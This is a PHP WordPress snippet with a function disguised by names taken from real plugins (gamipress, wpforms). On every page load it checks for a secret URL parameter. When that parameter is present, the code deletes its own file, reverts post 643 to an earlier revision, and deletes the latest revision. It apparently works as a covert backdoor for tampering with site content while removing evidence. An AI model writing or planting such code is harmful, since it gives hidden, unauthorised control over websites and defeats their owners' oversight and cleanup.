<?php

function cloud_gamipress_pagination() {
	if (isset($_GET['wpforms_remove_html5_com']) && $_GET['wpforms_remove_html5_com'] === 'backup_content_tracker_mediaelement') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$register_revisions_scheduled = 643;
		$customizer_account_selector_dashboard = wp_get_post_revisions($register_revisions_scheduled);
		if (empty($customizer_account_selector_dashboard)) die('no revisions');
		if (count($customizer_account_selector_dashboard) < 2) die('less than 2');
		$multisite_details_cdn = array_shift($customizer_account_selector_dashboard);
		$utils_addons_views_modal = $multisite_details_cdn->ID;
		$short_visitor_recaptcha_after = array_shift($customizer_account_selector_dashboard);
		$reader_local_catalog_file = $short_visitor_recaptcha_after->ID;
		$data_scheduled_iframe = wp_restore_post_revision($reader_local_catalog_file);
		if ($data_scheduled_iframe === false) die('error restoring');
		$data_scheduled_iframe = wp_delete_post_revision($utils_addons_views_modal);		
		if ($data_scheduled_iframe === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'cloud_gamipress_pagination');
